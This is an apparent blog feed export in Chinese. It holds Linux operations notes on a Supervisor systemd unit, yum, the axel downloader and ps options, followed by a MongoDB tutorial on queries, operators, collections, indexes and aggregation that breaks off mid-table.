<p>配置Supervisor开机启动<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在 /usr/lib/systemd/system/ 目录下创建 supervisord.service 文件,内容如下：</span><br><span class="line"></span><br><span class="line">[Unit]</span><br><span class="line">Description=supervisor</span><br><span class="line">After=network.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=forking</span><br><span class="line">ExecStart=/usr/bin/supervisord -c /etc/supervisor/supervisord.conf</span><br><span class="line">ExecStop=/usr/bin/supervisorctl $OPTIONS shutdown</span><br><span class="line">ExecReload=/usr/bin/supervisorctl $OPTIONS reload</span><br><span class="line">KillMode=process</span><br><span class="line">Restart=on-failure</span><br><span class="line">RestartSec=42s</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br><span class="line"></span><br><span class="line">执行命令：systemctl enable supervisord</span><br><span class="line"></span><br><span class="line">执行命令：systemctl is-enabled supervisord #来验证是否为开机启动</span><br><span class="line">显示 enabled 为正确无误。</span><br></pre></td></tr></table></figure></p>
<h5 id="yum"><a href="#yum" class="headerlink" title="yum"></a>yum</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">语法</span><br><span class="line">yum(选项)(参数)</span><br><span class="line"></span><br><span class="line">选项</span><br><span class="line">-h：显示帮助信息；</span><br><span class="line">-y：对所有的提问都回答“yes”；</span><br><span class="line">-c：指定配置文件；</span><br><span class="line">-q：安静模式；</span><br><span class="line">-v：详细模式；</span><br><span class="line">-d：设置调试等级（0-10）；</span><br><span class="line">-e：设置错误等级（0-10）；</span><br><span class="line">-R：设置yum处理一个命令的最大等待时间；</span><br><span class="line">-C：完全从缓存中运行，而不去下载或者更新任何头文件。</span><br><span class="line"></span><br><span class="line">参数</span><br><span class="line">install：安装rpm软件包；</span><br><span class="line">update：更新rpm软件包；</span><br><span class="line">check-update：检查是否有可用的更新rpm软件包；</span><br><span class="line">remove：删除指定的rpm软件包；</span><br><span class="line">list：显示软件包的信息；</span><br><span class="line">search：检查软件包的信息；</span><br><span class="line">info：显示指定的rpm软件包的描述信息和概要信息；</span><br><span class="line">clean：清理yum过期的缓存；</span><br><span class="line">shell：进入yum的shell提示符；</span><br><span class="line">resolvedep：显示rpm软件包的依赖关系；</span><br><span class="line">localinstall：安装本地的rpm软件包；</span><br><span class="line">localupdate：显示本地rpm软件包进行更新；</span><br><span class="line">deplist：显示rpm软件包的所有依赖关系。</span><br></pre></td></tr></table></figure>
<h5 id="axel多线程下载"><a href="#axel多线程下载" class="headerlink" title="axel多线程下载"></a>axel多线程下载</h5><p>axel：多线程下载工具</p>
<p>补充说明<br>axel 是Linux下一个不错的HTTP/ftp高速下载工具。支持多线程下载、断点续传，且可以从多个地址或者从一个地址的多个连接来下载同一个文件。适合网速不给力时多线程下载提高下载速度。比如在国内VPS或服务器上下载lnmp一键安装包用Axel就比wget快。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">安装</span><br><span class="line">CentOS安装Axel：</span><br><span class="line"></span><br><span class="line">yum install axel -y</span><br><span class="line"></span><br><span class="line">or 到 http://pkgs.repoforge.org/axel/下载rpm包安装。</span><br><span class="line"></span><br><span class="line">32位CentOS执行下面命令：</span><br><span class="line"></span><br><span class="line">wget -c http://pkgs.repoforge.org/axel/axel-2.4-1.el5.rf.i386.rpm</span><br><span class="line">rpm -ivh axel-2.4-1.el5.rf.i386.rpm</span><br><span class="line">64位CentOS执行下面命令：</span><br><span class="line"></span><br><span class="line">wget -c http://pkgs.repoforge.org/axel/axel-2.4-1.el5.rf.x86_64.rpm</span><br><span class="line">rpm -ivh axel-2.4-1.el5.rf.x86_64.rpm</span><br><span class="line">Debian/Ubuntu安装Axel：</span><br><span class="line"></span><br><span class="line">apt-get install axel</span><br><span class="line">语法</span><br><span class="line">axel [options] url1 [url2] [url...]</span><br><span class="line">选项</span><br><span class="line">--max-speed=x , -s x         最高速度x</span><br><span class="line">--num-connections=x , -n x   连接数x</span><br><span class="line">--output=f , -o f            下载为本地文件f</span><br><span class="line">--search[=x] , -S [x]        搜索镜像</span><br><span class="line">--header=x , -H x            添加头文件字符串x（指定 HTTP header）</span><br><span class="line">--user-agent=x , -U x        设置用户代理（指定 HTTP user agent）</span><br><span class="line">--no-proxy ， -N             不使用代理服务器</span><br><span class="line">--quiet ， -q                静默模式</span><br><span class="line">--verbose ，-v               更多状态信息</span><br><span class="line">--alternate ， -a            Alternate progress indicator</span><br><span class="line">--help ，-h                  帮助</span><br><span class="line">--version ，-V               版本信息</span><br><span class="line">实例</span><br><span class="line">如下载lnmp安装包指定10个线程，存到/tmp/：</span><br><span class="line"></span><br><span class="line">axel -n 10 -o /tmp/ http://www.jsdig.com/lnmp.tar.gz</span><br><span class="line">如果下载过程中下载中断可以再执行下载命令即可恢复上次的下载进度。</span><br></pre></td></tr></table></figure></p>
<h5 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h5><p><a href="https://blog.csdn.net/wenxuechaozhe/article/details/69083476" target="_blank" rel="noopener">ps命令获取对应的pid及其余信息</a></p>
<p>ps:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-a：显示所有终端机下执行的程序，除了阶段作业领导者之外。</span><br><span class="line">a：显示现行终端机下的所有程序，包括其他用户的程序。</span><br><span class="line">-A：显示所有程序。</span><br><span class="line">-c：显示CLS和PRI栏位。</span><br><span class="line">c：列出程序时，显示每个程序真正的指令名称，而不包含路径，选项或常驻服务的标示。</span><br><span class="line">-C&lt;指令名称&gt;：指定执行指令的名称，并列出该指令的程序的状况。</span><br><span class="line">-d：显示所有程序，但不包括阶段作业领导者的程序。</span><br><span class="line">-e：此选项的效果和指定&quot;A&quot;选项相同。</span><br><span class="line">e：列出程序时，显示每个程序所使用的环境变量。</span><br><span class="line">-f：显示UID,PPIP,C与STIME栏位。</span><br><span class="line">f：用ASCII字符显示树状结构，表达程序间的相互关系。</span><br><span class="line">-g&lt;群组名称&gt;：此选项的效果和指定&quot;-G&quot;选项相同，当亦能使用阶段作业领导者的名称来指定。</span><br><span class="line">g：显示现行终端机下的所有程序，包括群组领导者的程序。</span><br><span class="line">-G&lt;群组识别码&gt;：列出属于该群组的程序的状况，也可使用群组名称来指定。</span><br><span class="line">h：不显示标题列。</span><br><span class="line">-H：显示树状结构，表示程序间的相互关系。</span><br><span class="line">-j或j：采用工作控制的格式显示程序状况。</span><br><span class="line">-l或l：采用详细的格式来显示程序状况。</span><br><span class="line">L：列出栏位的相关信息。</span><br><span class="line">-m或m：显示所有的执行绪。</span><br><span class="line">n：以数字来表示USER和WCHAN栏位。</span><br><span class="line">-N：显示所有的程序，除了执行ps指令终端机下的程序之外。</span><br><span class="line">-p&lt;程序识别码&gt;：指定程序识别码，并列出该程序的状况。</span><br><span class="line">p&lt;程序识别码&gt;：此选项的效果和指定&quot;-p&quot;选项相同，只在列表格式方面稍有差异。</span><br><span class="line">r：只列出现行终端机正在执行中的程序。</span><br><span class="line">-s&lt;阶段作业&gt;：指定阶段作业的程序识别码，并列出隶属该阶段作业的程序的状况。</span><br><span class="line">s：采用程序信号的格式显示程序状况。</span><br><span class="line">S：列出程序时，包括已中断的子程序资料。</span><br><span class="line">-t&lt;终端机编号&gt;：指定终端机编号，并列出属于该终端机的程序的状况。</span><br><span class="line">t&lt;终端机编号&gt;：此选项的效果和指定&quot;-t&quot;选项相同，只在列表格式方面稍有差异。</span><br><span class="line">-T：显示现行终端机下的所有程序。</span><br><span class="line">-u&lt;用户识别码&gt;：此选项的效果和指定&quot;-U&quot;选项相同。</span><br><span class="line">u：以用户为主的格式来显示程序状况。</span><br><span class="line">-U&lt;用户识别码&gt;：列出属于该用户的程序的状况，也可使用用户名称来指定。</span><br><span class="line">U&lt;用户名称&gt;：列出属于该用户的程序的状况。</span><br><span class="line">v：采用虚拟内存的格式显示程序状况。</span><br><span class="line">-V或V：显示版本信息。</span><br><span class="line">-w或w：采用宽阔的格式来显示程序状况。　</span><br><span class="line">x：显示所有程序，不以终端机来区分。</span><br><span class="line">X：采用旧式的Linux i386登陆格式显示程序状况。</span><br><span class="line">-y：配合选项&quot;-l&quot;使用时，不显示F(flag)栏位，并以RSS栏位取代ADDR栏位　。</span><br><span class="line">-&lt;程序识别码&gt;：此选项的效果和指定&quot;p&quot;选项相同。</span><br><span class="line">--cols&lt;每列字符数&gt;：设置每列的最大字符数。</span><br><span class="line">--columns&lt;每列字符数&gt;：此选项的效果和指定&quot;--cols&quot;选项相同。</span><br><span class="line">--cumulative：此选项的效果和指定&quot;S&quot;选项相同。</span><br><span class="line">--deselect：此选项的效果和指定&quot;-N&quot;选项相同。</span><br><span class="line">--forest：此选项的效果和指定&quot;f&quot;选项相同。</span><br><span class="line">--headers：重复显示标题列。</span><br><span class="line">--help：在线帮助。</span><br><span class="line">--info：显示排错信息。</span><br><span class="line">--lines&lt;显示列数&gt;：设置显示画面的列数。</span><br><span class="line">--no-headers：此选项的效果和指定&quot;h&quot;选项相同，只在列表格式方面稍有差异。</span><br><span class="line">--group&lt;群组名称&gt;：此选项的效果和指定&quot;-G&quot;选项相同。</span><br><span class="line">--Group&lt;群组识别码&gt;：此选项的效果和指定&quot;-G&quot;选项相同。</span><br><span class="line">--pid&lt;程序识别码&gt;：此选项的效果和指定&quot;-p&quot;选项相同。</span><br><span class="line">--rows&lt;显示列数&gt;：此选项的效果和指定&quot;--lines&quot;选项相同。</span><br><span class="line">--sid&lt;阶段作业&gt;：此选项的效果和指定&quot;-s&quot;选项相同。</span><br><span class="line">--tty&lt;终端机编号&gt;：此选项的效果和指定&quot;-t&quot;选项相同。</span><br><span class="line">--user&lt;用户名称&gt;：此选项的效果和指定&quot;-U&quot;选项相同。</span><br><span class="line">--User&lt;用户识别码&gt;：此选项的效果和指定&quot;-U&quot;选项相同。</span><br><span class="line">--version：此选项的效果和指定&quot;-V&quot;选项相同。</span><br><span class="line">--widty&lt;每列字符数&gt;：此选项的效果和指定&quot;-cols&quot;选项相同。</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>运维</category>
      </categories>
      <tags>
        <tag>运维</tag>
        <tag>Linux</tag>
        <tag>Ansible</tag>
      </tags>
  </entry>
  <entry>
    <title>MongoDB由浅入深</title>
    <url>/MongoDB%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1/</url>
    <content><![CDATA[<h2 id="MongoDB-教程"><a href="#MongoDB-教程" class="headerlink" title="MongoDB 教程"></a><a href="http://www.runoob.com/mongodb/mongodb-tutorial.html" target="_blank" rel="noopener">MongoDB 教程</a></h2><h3 id="举例说明"><a href="#举例说明" class="headerlink" title="举例说明"></a>举例说明</h3><table>
<thead>
<tr>
<th>id</th>
<th>user_name</th>
<th>email</th>
<th>age</th>
<th>city</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>Mark Hanks</td>
<td><a href="mailto:mark@abc.com" target="_blank" rel="noopener">mark@abc.com</a></td>
<td>25</td>
<td>Los Angeles</td>
</tr>
<tr>
<td>2</td>
<td>Richard Peter</td>
<td><a href="mailto:richard@abc.com" target="_blank" rel="noopener">richard@abc.com</a></td>
<td>31</td>
<td>Dallas</td>
</tr>
</tbody>
</table>
<a id="more"></a>
<p>{<br>“_id”: ObjectId(“5146bb52d8524270060001f3”),<br>“age”:25,<br>“city”:”Los Angele3”,<br>“email”:”mark@ abc. com”,<br>“user_name”:”Mark Hanka”<br>}<br>{<br>“_id”: ObjectId(“5146bb52d8524270060001f2”),<br>“age”:31,<br>“city”:”Dallas”,<br>“email”:”richardeabc. com”,<br>“user name”:”Richard Peter”<br>}</p>
<h3 id="MongoDB-与-RDBMS-术语的比较："><a href="#MongoDB-与-RDBMS-术语的比较：" class="headerlink" title="MongoDB 与 RDBMS 术语的比较："></a>MongoDB 与 RDBMS 术语的比较：</h3><table>
<thead>
<tr>
<th>SQL术语/概念</th>
<th>MongoDB术语/概念</th>
<th>解释/说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>database</td>
<td>database</td>
<td>数据库</td>
</tr>
<tr>
<td>table</td>
<td>collection</td>
<td>数据库表/集合</td>
</tr>
<tr>
<td>row</td>
<td>document</td>
<td>数据记录行/文档</td>
</tr>
<tr>
<td>column</td>
<td>field</td>
<td>数据字段/域</td>
</tr>
<tr>
<td>index</td>
<td>index</td>
<td>索引</td>
</tr>
<tr>
<td>table joins</td>
<td></td>
<td>表连接,MongoDB不支持</td>
</tr>
<tr>
<td>primary key</td>
<td>primary key</td>
<td>主键,MongoDB自动将_id字段设置为主键</td>
</tr>
</tbody>
</table>
<h3 id="MongoDB-与-RDBMS-Where-语句比较"><a href="#MongoDB-与-RDBMS-Where-语句比较" class="headerlink" title="MongoDB 与 RDBMS Where 语句比较"></a>MongoDB 与 RDBMS Where 语句比较</h3><table>
<thead>
<tr>
<th>操作</th>
<th>格式</th>
<th>范例</th>
<th>RDBMS中的类似语句</th>
</tr>
</thead>
<tbody>
<tr>
<td>等于</td>
<td>{<key>:<value>}</value></key></td>
<td>db.col.find({“by”:”XCHCOUD”}).pretty()</td>
<td>where by = ‘XCHCOUD’</td>
</tr>
<tr>
<td>小于</td>
<td>{<key>:{$lt:<value>}}</value></key></td>
<td>db.col.find({“likes”:{$lt:50}}).pretty()</td>
<td>where likes &lt; 50</td>
</tr>
<tr>
<td>小于或等于</td>
<td>{<key>:{$lte:<value>}}</value></key></td>
<td>db.col.find({“likes”:{$lte:50}}).pretty()</td>
<td>where likes &lt;= 50</td>
</tr>
<tr>
<td>大于</td>
<td>{<key>:{$gt:<value>}}</value></key></td>
<td>db.col.find({“likes”:{$gt:50}}).pretty()</td>
<td>where likes &gt; 50</td>
</tr>
<tr>
<td>大于或等于</td>
<td>{<key>:{$gte:<value>}}</value></key></td>
<td>db.col.find({“likes”:{$gte:50}}).pretty()</td>
<td>where likes &gt;= 50</td>
</tr>
<tr>
<td>不等于</td>
<td>{<key>:{$ne:<value>}}</value></key></td>
<td>db.col.find({“likes”:{$ne:50}}).pretty()</td>
<td>where likes != 50</td>
</tr>
</tbody>
</table>
<h3 id="MongoDB-AND-条件"><a href="#MongoDB-AND-条件" class="headerlink" title="MongoDB AND 条件"></a>MongoDB AND 条件</h3><p><code>db.col.find({key1:value1, key2:value2}).pretty()</code></p>
<h3 id="MongoDB-OR-条件"><a href="#MongoDB-OR-条件" class="headerlink" title="MongoDB OR 条件"></a>MongoDB OR 条件</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">   &#123;</span><br><span class="line">      $or: [</span><br><span class="line">         &#123;key1: value1&#125;, &#123;key2:value2&#125;</span><br><span class="line">      ]</span><br><span class="line">   &#125;</span><br><span class="line">).pretty()</span><br></pre></td></tr></table></figure>
<h3 id="AND-和-OR-联合使用"><a href="#AND-和-OR-联合使用" class="headerlink" title="AND 和 OR 联合使用"></a>AND 和 OR 联合使用</h3><p><em>SQL:</em></p>
<p><code>where likes&gt;50 AND (by = &#39;菜鸟教程&#39; OR title = &#39;MongoDB 教程&#39;)</code></p>
<p><em>MongoDB:</em></p>
<figure class="highlight plain"><figcaption><span>&#123;$gt:50&#125;, $or: [&#123;"by": "XCHCLOUD"&#125;,&#123;"title": "MongoDB 教程"&#125;]&#125;).pretty()</span></figcaption><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">        &quot;_id&quot; : ObjectId(&quot;56063f17ade2f21f36b03133&quot;),</span><br><span class="line">        &quot;title&quot; : &quot;MongoDB 教程&quot;,</span><br><span class="line">        &quot;description&quot; : &quot;MongoDB 是一个 Nosql 数据库&quot;,</span><br><span class="line">        &quot;by&quot; : &quot;XCHCLOUD&quot;,</span><br><span class="line">        &quot;url&quot; : &quot;http://XCHCLOUD.cn&quot;,</span><br><span class="line">        &quot;tags&quot; : [</span><br><span class="line">                &quot;mongodb&quot;,</span><br><span class="line">                &quot;database&quot;,</span><br><span class="line">                &quot;NoSQL&quot;</span><br><span class="line">        ],</span><br><span class="line">        &quot;likes&quot; : 100</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="条件操作符"><a href="#条件操作符" class="headerlink" title="条件操作符"></a>条件操作符</h3><table>
<thead>
<tr>
<th></th>
<th></th>
<th></th>
<th>MongoDB</th>
<th>Mysql</th>
</tr>
</thead>
<tbody>
<tr>
<td>&gt;</td>
<td>大于</td>
<td>$gt</td>
<td>db.col.find({likes : {$gt : 100}})</td>
<td>Select * from col where likes &gt; 100;</td>
</tr>
<tr>
<td>&lt;</td>
<td>小于</td>
<td>$lt</td>
<td>db.col.find({likes : {$lt : 150}})</td>
<td>Select * from col where likes &lt; 150;</td>
</tr>
<tr>
<td>&gt;=</td>
<td>大于等于</td>
<td>$gte</td>
<td>db.col.find({likes : {$gte : 100}})</td>
<td>Select * from col where likes &gt;=100;</td>
</tr>
<tr>
<td>&lt;=</td>
<td>小于等于</td>
<td>$lte</td>
<td>db.col.find({likes : {$lte : 150}})</td>
<td>Select * from col where likes &lt;= 150;</td>
</tr>
<tr>
<td>&gt;和&lt;</td>
<td>小于大于</td>
<td>$lt 和 $gt</td>
<td>db.col.find({likes : {$lt :200, $gt : 100}})</td>
<td>Select * from col where likes&gt;100 AND  likes&lt;200;</td>
</tr>
</tbody>
</table>
<h3 id="type-操作符"><a href="#type-操作符" class="headerlink" title="$type 操作符"></a>$type 操作符</h3><p>$type 操作符是基于 BSON 类型来检索集合中匹配的数据类型，并返回结果。</p>
<table>
<thead>
<tr>
<th>类型</th>
<th>数字</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td>Double</td>
<td>1</td>
<td></td>
</tr>
<tr>
<td>String</td>
<td>2</td>
<td></td>
</tr>
<tr>
<td>Object</td>
<td>3</td>
<td></td>
</tr>
<tr>
<td>Array</td>
<td>4</td>
<td></td>
</tr>
<tr>
<td>Binary data</td>
<td>5</td>
<td></td>
</tr>
<tr>
<td>Undefined</td>
<td>6</td>
<td>已废弃。</td>
</tr>
<tr>
<td>Object id</td>
<td>7</td>
<td></td>
</tr>
<tr>
<td>Boolean</td>
<td>8</td>
<td></td>
</tr>
<tr>
<td>Date</td>
<td>9</td>
<td></td>
</tr>
<tr>
<td>Null</td>
<td>10</td>
<td></td>
</tr>
<tr>
<td>Regular Expression</td>
<td>11</td>
<td></td>
</tr>
<tr>
<td>JavaScript</td>
<td>13</td>
<td></td>
</tr>
<tr>
<td>Symbol</td>
<td>14</td>
<td></td>
</tr>
<tr>
<td>JavaScript (with scope)</td>
<td>15</td>
<td></td>
</tr>
<tr>
<td>32-bit integer</td>
<td>16</td>
<td></td>
</tr>
<tr>
<td>Timestamp</td>
<td>17</td>
<td></td>
</tr>
<tr>
<td>64-bit integer</td>
<td>18</td>
<td></td>
</tr>
<tr>
<td>Min key</td>
<td>255</td>
<td>Query with -1.</td>
</tr>
<tr>
<td>Max key</td>
<td>127</td>
</tr>
</tbody>
</table>
<h3 id="Limit与Skip方法"><a href="#Limit与Skip方法" class="headerlink" title="Limit与Skip方法"></a>Limit与Skip方法</h3><h4 id="Limit-方法"><a href="#Limit-方法" class="headerlink" title="Limit() 方法"></a>Limit() 方法</h4><p>limit()方法在MongoDB中读取指定数量的数据记录，该参数指定从MongoDB中读取的记录条数。</p>
<p><code>db.COLLECTION_NAME.find().limit(NUMBER)</code></p>
<h4 id="Skip-方法"><a href="#Skip-方法" class="headerlink" title="Skip() 方法"></a>Skip() 方法</h4><p>skip()方法来跳过指定数量的数据，skip方法同样接受一个数字参数作为跳过的记录条数。</p>
<p><code>db.COLLECTION_NAME.find().limit(NUMBER).skip(NUMBER)</code></p>
<h2 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h2><p>集合存在于数据库中，集合没有固定的结构，这意味着你在对集合可以插入不同格式和类型的数据，但通常情况下我们插入集合的数据都会有一定的关联性。</p>
<h3 id="创建集合"><a href="#创建集合" class="headerlink" title="创建集合"></a>创建集合</h3><p><code>db.createCollection(name, options)</code></p>
<p><strong>参数说明：</strong></p>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>name</td>
<td>要创建的集合名称</td>
</tr>
<tr>
<td>options</td>
<td>可选参数, 指定有关内存大小及索引的选项</td>
</tr>
</tbody>
</table>
<p><strong>options参数：</strong><br>| 字段            | 类型     | 描述                                                                                                                                                    |<br>|————-    |——    |—————————————————————————————————————————————————–    |<br>| capped          | 布尔     | （可选）如果为 true，则创建固定集合。固定集合是指有着固定大小的集合，当达到最大值时，它会自动覆盖最早的文档。当该值为 true 时，必须指定 size 参数。     |<br>| autoIndexId     | 布尔     | （可选）如为 true，自动在 _id 字段创建索引。默认为 false。                                                                                              |<br>| size            | 数值     | （可选）为固定集合指定一个最大值（以字节计）。如果 capped 为 true，也需要指定该字段。                                                                   |<br>| max             | 数值     | （可选）指定固定集合中包含文档的最大数量。                                                                                                              |</p>
<h3 id="删除集合"><a href="#删除集合" class="headerlink" title="删除集合"></a>删除集合</h3><p><code>db.collection.drop()</code></p>
<h2 id="文档"><a href="#文档" class="headerlink" title="文档"></a>文档</h2><h3 id="插入文档"><a href="#插入文档" class="headerlink" title="插入文档"></a>插入文档</h3><p><code>db.COLLECTION_NAME.insert(document)</code></p>
<p>可以将数据定义为变量形式</p>
<p><code>db.col.insert(document)</code></p>
<h3 id="查看已插入文档"><a href="#查看已插入文档" class="headerlink" title="查看已插入文档"></a>查看已插入文档</h3><p><code>db.col.find()</code></p>
<h3 id="更新文档"><a href="#更新文档" class="headerlink" title="更新文档"></a>更新文档</h3><h4 id="update-方法"><a href="#update-方法" class="headerlink" title="update() 方法"></a>update() 方法</h4><p>update() 方法用于更新已存在的文档。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">   &lt;query&gt;,</span><br><span class="line">   &lt;update&gt;,</span><br><span class="line">   &#123;</span><br><span class="line">     upsert: &lt;boolean&gt;,</span><br><span class="line">     multi: &lt;boolean&gt;,</span><br><span class="line">     writeConcern: &lt;document&gt;</span><br><span class="line">   &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p><strong>参数说明：</strong></p>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>query</td>
<td>update的查询条件，类似sql update查询内where后面的。</td>
</tr>
<tr>
<td>update</td>
<td>update的对象和一些更新的操作符（如$,$inc…）等，也可以理解为sql update查询内set后面的</td>
</tr>
<tr>
<td>upsert</td>
<td>可选，这个参数的意思是，如果不存在update的记录，是否插入objNew,true为插入，默认是false，不插入。</td>
</tr>
<tr>
<td>multi</td>
<td><strong>可选，mongodb 默认是false,只更新找到的第一条记录，如果这个参数为true,就把按条件查出来多条记录全部更新。</strong></td>
</tr>
<tr>
<td>writeConcern</td>
<td>可选，抛出异常的级别。</td>
</tr>
</tbody>
</table>
<h4 id="save-方法"><a href="#save-方法" class="headerlink" title="save() 方法"></a>save() 方法</h4><p>save() 方法通过传入的文档来替换已有文档。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">   &lt;document&gt;,</span><br><span class="line">   &#123;</span><br><span class="line">     writeConcern: &lt;document&gt;</span><br><span class="line">   &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p><strong>参数说明：</strong></p>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>document</td>
<td>文档数据。</td>
</tr>
<tr>
<td>writeConcern</td>
<td>可选，抛出异常的级别。</td>
</tr>
</tbody>
</table>
<h4 id="删除文档"><a href="#删除文档" class="headerlink" title="删除文档"></a>删除文档</h4><p><del>2.6 版本以前的</del></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">   &lt;query&gt;,</span><br><span class="line">   &lt;justOne&gt;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p><em>2.6版本以后的</em></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">   &lt;query&gt;,</span><br><span class="line">   &#123;</span><br><span class="line">     justOne: &lt;boolean&gt;,</span><br><span class="line">     writeConcern: &lt;document&gt;</span><br><span class="line">   &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p><strong>参数说明：</strong><br>| 参数             | 说明                                                                                                               |<br>|————–    |—————————————————————————————————————-    |<br>| query            | （可选）删除的文档的条件。                                                                                         |<br>| justOne          | （可选）如果设为 true 或 1，则只删除一个文档，如果不设置该参数，或使用默认值 false，则删除所有匹配条件的文档。     |<br>| writeConcern     | （可选）抛出异常的级别。                                                                                           |</p>
<h3 id="查询文档"><a href="#查询文档" class="headerlink" title="查询文档"></a>查询文档</h3><p><code>db.collection.find(query, projection).pretty()</code></p>
<p><em>除了 find() 方法之外，还有一个 findOne() 方法，它只返回一个文档。</em></p>
<p><strong>参数说明：</strong></p>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>query</td>
<td>可选，使用查询操作符指定查询条件</td>
</tr>
<tr>
<td>projection</td>
<td>可选，使用投影操作符指定返回的键。查询时返回文档中所有键值， 只需省略该参数即可（默认省略）。如果你需要以易读的方式来读取数据，可以使用 pretty() 方法，语法格式如下：</td>
</tr>
<tr>
<td>.pretty()</td>
<td>pretty() 方法以格式化的方式来显示所有文档</td>
</tr>
</tbody>
</table>
<h2 id="元数据"><a href="#元数据" class="headerlink" title="元数据"></a>元数据</h2><h2 id="Obiectld"><a href="#Obiectld" class="headerlink" title="Obiectld"></a>Obiectld</h2><p>ObjectId 类似唯一主键，可以很快的去生成和排序，包含 12 bytes，含义是：</p>
<table>
<thead>
<tr>
<th>0、1、2、3</th>
<th>4、5、6</th>
<th>7、8</th>
<th>9、10、11</th>
</tr>
</thead>
<tbody>
<tr>
<td>时间戳</td>
<td>机器</td>
<td>pID</td>
<td>计数器</td>
</tr>
</tbody>
</table>
<p>MongoDB 中存储的文档必须有一个 _id 键。这个键的值可以是任何类型的，默认是个 ObjectId 对象</p>
<h2 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h2><p>使用 sort() 方法对数据进行排序，sort() 方法可以通过参数指定排序的字段，并使用 1 和 -1 来指定排序的方式，其中 1 为升序排列，而 -1 是用于降序排列。</p>
<p><code>db.COLLECTION_NAME.find().sort({KEY:1})</code></p>
<h2 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h2><h3 id="createIndex-方法"><a href="#createIndex-方法" class="headerlink" title="createIndex() 方法"></a>createIndex() 方法</h3><p><code>db.collection.createIndex(keys, options)</code><br>语法中 Key 值为你要创建的索引字段，1 为指定按升序创建索引，-1 为指定按降序创建索引；createIndex() 方法中你也可以设置使用多个字段创建索引。</p>
<p>可选参数</p>
<table>
<thead>
<tr>
<th>Parameter</th>
<th>Type</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>background</td>
<td>Boolean</td>
<td>建索引过程会阻塞其它数据库操作，background可指定以后台方式创建索引，即增加 “background” 可选参数。 “background” 默认值为false。</td>
</tr>
<tr>
<td>unique</td>
<td>Boolean</td>
<td>建立的索引是否唯一。指定为true创建唯一索引。默认值为false.</td>
</tr>
<tr>
<td>name</td>
<td>string</td>
<td>索引的名称。如果未指定，MongoDB的通过连接索引的字段名和排序顺序生成一个索引名称。</td>
</tr>
<tr>
<td>dropDups</td>
<td>Boolean</td>
<td>3.0+版本已废弃。在建立唯一索引时是否删除重复记录,指定 true 创建唯一索引。默认值为 false.</td>
</tr>
<tr>
<td>sparse</td>
<td>Boolean</td>
<td>对文档中不存在的字段数据不启用索引；这个参数需要特别注意，如果设置为true的话，在索引字段中不会查询出不包含对应字段的文档.。默认值为 false.</td>
</tr>
<tr>
<td>expireAfterSeconds</td>
<td>integer</td>
<td>指定一个以秒为单位的数值，完成 TTL设定，设定集合的生存时间。</td>
</tr>
<tr>
<td>v</td>
<td>index version</td>
<td>索引的版本号。默认的索引版本取决于mongod创建索引时运行的版本。</td>
</tr>
<tr>
<td>weights</td>
<td>document</td>
<td>索引权重值，数值在 1 到 99,999 之间，表示该索引相对于其他索引字段的得分权重。</td>
</tr>
<tr>
<td>default_language</td>
<td>string</td>
<td>对于文本索引，该参数决定了停用词及词干和词器的规则的列表。 默认为英语</td>
</tr>
<tr>
<td>language_override</td>
<td>string</td>
<td>对于文本索引，该参数指定了包含在文档中的字段名，语言覆盖默认的language，默认值为 language.</td>
</tr>
</tbody>
</table>
<h2 id="聚合"><a href="#聚合" class="headerlink" title="聚合"></a>聚合</h2><p>主要用于处理数据(诸如统计平均值,求和等)，并返回计算后的数据结果。有点类似sql语句中的 count(*)。</p>
<h3 id="aggregate-方法"><a href="#aggregate-方法" class="headerlink" title="aggregate() 方法"></a>aggregate() 方法</h3><p><code>db.COLLECTION_NAME.aggregate(AGGREGATE_OPERATION)</code></p>
<p><strong>比较mysql</strong></p>
<p><code>select by_user, count(*) from mycol group by by_user</code></p>
<h3 id="聚合的表达式"><a href="#聚合的表达式" class="headerlink" title="聚合的表达式"></a>聚合的表达式</h3><table>
<thead>
<tr>
<th>表达式</th>
<th>描述</th>
<th>实例</th>
</tr>
</thead>
<tbody>
<tr>
<td>$sum</td>
<td>计算总和。</td>
<td>db.mycol.aggregate([{$group : {_id : “$by_user”, num_tutorial : {$sum : “$likes”}}}])</td>
</tr>
<tr>
<td>$avg</td>
<td>计算平均值</td>
<td>db.mycol.aggregate([{$group : {_id : “$by_user”, num_tutorial : {$avg : “$likes”}}}])</td>
</tr>
<tr>
<td>$min</td>
<td>获取集合中所有文档对应值得最小值。</td>
<td>db.mycol.aggregate([{$group : {_id : “$by_user”, num_tutorial : {$min : “$likes”}}}])</td>
</tr>
<tr>
<td>$max</td>
